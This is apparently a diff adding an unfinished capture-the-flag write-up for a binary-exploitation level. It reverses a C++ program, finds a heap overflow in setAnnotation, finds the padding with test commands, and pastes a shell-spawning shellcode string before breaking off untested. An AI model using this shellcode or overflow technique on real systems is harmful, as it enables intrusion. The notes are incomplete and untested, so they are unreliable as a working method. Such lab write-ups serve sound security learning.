@@ -1,0 +1,40 @@
+0) Random tests
+	- I meens the program does not nothing (test with or without args)
+
+1) Analyse the binary
+	- In gdb with "info functions" is possible to visualise the functions of the binary,
+		the code seems to c++. We can see there's a class 'N' who takes an int as constructor,
+		the c++ operator new seems to be used too and there are 2 opartor defined the '+' and the '-'.
+	- Ok, well before proceed i decided to write the stuff in c++.
+	- The function setAnnotation performs an arbitrary write with memcpy to the char[100] stored in the class,
+		so is possible to overflow this variable.
+	- In the main there are 2 instances of the class N, both allocated in the heap, i think is possible to
+		overwrite the second address overflowing from the first one. Then is possible to redirect eip to the
+		stack, in the stack i can place some shellcode who calls system.
+
+2) Explotation
+
+- Find the necesary padding to reach the second N instance, just need to overflow it.
+
+~$ ./level9 $(python -c 'print "A"*109')
+// SIGSEGV is raised
+
+~$ ./level9 $(python -c 'print "A"*108')
+// all Ok
+
+// We can conclude that the address of the second instance of 'N' is located at 108 bytes from the array of chars located in the first instance
+// Knowing malloc metadata is 0x8 bytes, the array of chars in N has a lenght of 100 bytes (just useful to the reversed code in cpp)
+
+- I can overwrite the address of the second instance to jump into the stack for example (i'm lucky the stack is executable), in the stack i can place
+some NOPs to don't care about aligning and then put some shellcode who call systhem.
+
+I will use the following shellcode:
+
+https://www.exploit-db.com/shellcodes/47008
+
+My scrypt:
+
+shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+
+.... fck this arch OS my vm doesn't support networking i ve done all this projet in the rainfall vm and i can test it.
+For no forget i ve here a little bit of help https://seanmurphree.com/blog/?p=157
